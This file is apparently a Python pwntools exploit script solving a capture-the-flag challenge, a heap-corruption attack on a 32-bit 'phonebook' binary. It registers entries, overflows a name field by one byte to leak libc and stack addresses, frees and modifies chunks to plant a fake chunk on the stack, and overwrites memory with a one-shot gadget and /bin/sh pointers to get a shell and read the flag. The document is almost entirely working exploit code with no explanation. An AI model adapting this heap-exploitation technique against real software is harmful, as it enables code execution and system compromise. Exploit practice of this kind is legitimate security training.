from pwn import * 

s = process('./phonebook')
e = ELF('./phonebook')

def register(name, phone, birth):
	s.sendline("1")
	s.recv()
	s.send(name)
	s.recv()
	s.send(phone)
	s.recv()
	s.send(birth)
	s.recvuntil("Select_menu >")

def exploit(name, phone, birth):
	s.sendline("1")
	s.recv()
	s.send(name)
	s.recv()	
	s.send(phone)
	s.recv()
	s.send(birth)
	s.recv(1024)

def leak():
	s.sendline("2")
	s.recvuntil("B"*40)
	leak = u32(s.recv(4))
	stack_leak = u32(s.recv(4))
	s.recv()
	return leak, stack_leak

def free(index):
	s.sendline("3")
	s.recv()
	s.sendline(index)
        s.recvuntil("Select_menu >")


def modify(index, option, data):
	s.sendline("4")
	s.recv()
	s.sendline(index)
	s.recv()
	s.sendline(option)
	s.recv()
	s.send(data)
        s.recvuntil("Select_menu >")


s.recv()


register("A"*40, "A"*40, "A"*12)
modify("1", "1", "B"*41)

leak, stack = leak()
libc = leak - 0x1b2042
hook = libc + 0x1b2768
oneshot = libc + 0x3ac5c
system = libc + 0x3ada0
binsh = libc + 1423883

print 'stack      : ' + str(hex(stack))
print 'libc       : ' + str(hex(libc))
print 'system     : ' + str(hex(system))
print 'fake_chunk : ' + str(hex(stack-0x18))
print '/bin/sh    : ' + str(hex(binsh))

register("a"*0x10, "a"*0x10, "a"*40)
register("a"*0x10, "b"*0x10, "b"*40)

free("3")
free("2")
modify("2", "3", p32(stack-0x18)) # fake chunk set

exploit("a"*0x10, "B"*50, p32(binsh)*5 + p32(oneshot) + p32(stack+12) + p32(stack-12) + p32(binsh)*4)

s.sendline("cat flag")
s.interactive()
